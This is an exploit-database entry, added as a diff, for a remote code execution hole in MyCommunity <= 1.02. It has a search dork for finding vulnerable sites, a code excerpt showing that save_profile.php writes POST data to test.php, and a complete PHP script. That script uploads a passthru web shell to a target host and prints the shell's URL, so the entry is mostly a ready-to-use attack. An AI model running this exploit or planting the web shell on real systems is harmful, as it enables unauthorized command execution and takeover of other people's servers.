@@ -1,0 +1,164 @@
+id: 12882
+date: 06/23/2010
+title: MyCommunity <= V1.02 Remote Code Execution
+author: Lord-Anubis
+cves: 
+
+==========================================
+MyCommunity <= V1.02 Remote Code Execution 
+==========================================
+
+
++-------------------------------------------------------------------------------------------------------------------------------+
+|				 _______         __                ______     							|
+|				|    |  |.--.--.|  |--..-----.    |      |.----..-----..--.--.--.				|
+|				|       ||  |  ||    < |  -__|    |   ---||   _||  -__||  |  |  |				|
+|				|__|____||_____||__|__||_____|    |______||__|  |_____||________|				|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Name: MyCommunity <= V1.02 Remote Code Execution 										|
+| Software: MyCommunity <= V1.02												|
+| Site: http://articstudios.net/download.php											|
+| Download: http://articstudios.net/mycommunityscript/files/MyCommunity%201.0.2.rar						|
+| Vulnerability: Remote Code Execution												|
+| Severity: high ( low / medium / high )											|
+| Tested on: 1.02														|
+| Dork: 'The script is made by "Artic Studios"'											|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Author: Lord-Anubis														|
+| Contact: lord.anu bis4[at]gm ail[dot]com											|
+| Date: 23.06.2010 ( dd.mm.yyyy )												|
+| Site: http://lordanubis.altervista.org/											|
+| Defaces: http://www.zone-h.org/archive/notifier=Lord-Anubis									|
+| Exploits: http://inj3ct0r.com/author/2486											|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug File: save_profile.php													|
+| 3.	if ( isset( $_POST ) )													|
+| 4.		$postArray = &$_POST ;            // 4.1.0 or later, use $_POST							|
+| 5.	else															|
+| 6.		$postArray = &$HTTP_POST_VARS ;    // prior to 4.1.0, use HTTP_POST_VARS					|
+| 7.																|
+| 8.	foreach ( $postArray as $sForm => $value )										|
+| 9.	{															|
+| 10		$postedValue = htmlspecialchars( stripslashes( $value ) ) ;							|
+| 11.	$writeValue = stripslashes( $value ) ; 											|
+| 12.																|
+| 13.	// Open the file for truncated writing											|
+| 14.	$fp = @fopen("test.php", "w") or die("Couldn't open file for writing!"); //change mypage.html to point to the file you	|
+| 15.	want to edit														|
+| 15.	$numBytes = @fwrite($fp, $writeValue) or die("Couldn't write html to file!");						|													|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Bug Explanation:														|
+|	- EN:	The file save_profile.php allows the creation of a page called test.php without any control on the data POST's	|
+|		origin, indeed happens the stripslashes on the strings. Now it will be possible create any  page with any	|
+|		content.													|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- ITA:	Il file save_profile.php permette la creazione di una pagina chiamata test.php non effettuando alcun controllo	|
+|		sulla provenienza dei dati POST, anzi viene addirittura lo stripslashes sulle stringhe. SarÐ° cosÐ¼ possibile	|
+|		creare una pagina qualsiasi con un qualsiasi nostro contenuto.							|
+|	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////	|
+|	- PL:	...														|
++-------------------------------------------------------------------------------------------------------------------------------+
+| Exploit:															|
++-------------------------------------------------------------------------------------------------------------------------------+
+<?php
+/**
+ * exploit.php
+ *
+ * Software: MyCommunity <= V1.02 
+ * Author: Lord-Anubis <lord.anu bis4[at]gm ail[dot]com>
+ * Vulnerability: Remote Code Execution
+ */
+
+//
+error_reporting(0);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+//
+function sendPacket($packet) {
+	global $hostName;
+	if (!$sock = fsockopen(gethostbyname($hostName), 80)) {
+		exit("[-] No response from '{$hostName}'\n");
+	}
+
+	fputs($sock, $packet);
+	while (!feof($sock)) {
+		$html .= fgets($sock);
+	}
+	
+	fclose($sock);
+	return $html;
+}
+
+//
+
+//
+function phpCode() {
+	return	"<?php ob_end_clean();ob_clean();passthru(\$_GET['cmd']);die('Lord-Anubis');?>";
+}
+
+//
+if (php_sapi_name() !== 'cli') {
+	exit(
+		"<html><head><title>Attention!</title></head>\n".
+		"<body><br /><br /><center>\n".
+		"<h1>Error!</h1>\n".
+		"This exploit is meant to be used as php CLI script!<br />\n".
+		"More information:<br />\n".
+		"<a href=\"http://www.google.com/search?hl=en&q=php+cli+windows\" target=\"_blank\">http://www.google.com/search?hl=en&q=php+cli+windows</a><br />\n".
+		"This script will not run through a webserver.<br />\n".
+		"</center></body></html>\n"
+	);
+}
+
+//
+if ($argc != 3) {
+	exit(
+		"[+] Software: MyCommunity <= V1.01\n".
+		"[+] Author: Lord-Anubis\n".
+		"[+] Vulnerability: Remote Code Execution\n".
+		"[+] Usage: ./exploit [hostName] [path]\n".
+		"[+] Example:\n".
+		"[+] ./exploit 127.0.0.1 /\n".
+		"[+] ./exploit hostname.com /upload/\n"
+	);
+}
+
+//
+list($cli, $hostName, $path) = $argv;
+
+//
+$getUrl   = parse_url($hostName);
+$hostName = $getUrl["path"];
+if (substr($hostName, 0, 4) == 'www.') {
+	$hostName = substr($hostName, 3);
+}
+
+//
+if (substr($path, 0, 1) != "/")	{ $path = "/$path"; }
+if (substr($path, -1) != "/")	{ $path = "$path/"; }
+
+//
+$postData = "post=".phpCode();
+$packet   = "POST http://{$hostName}{$path}save_profile.php HTTP/1.1\r\n";
+$packet  .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet  .= "Host: {$hostName}\r\n";
+$packet  .= "Content-Length: ".strlen($postData)."\r\n";
+$packet	 .= "Referer: http://{$hostName}{$path}\r\n\r\n";
+$packet  .= $postData;
+$return   = sendPacket($packet);
+
+//
+if (!preg_match('/Lord\-Anubis/is', $return)) {
+	exit("[-] Exploit failed\n");
+}
+
+//
+echo("[+] http://{$hostName}{$path}test.php\n");
+echo("[+] Exploit successfull\n");
+exit;
+?>
+
+
+
+#  0day.today [2023-03-26]  #
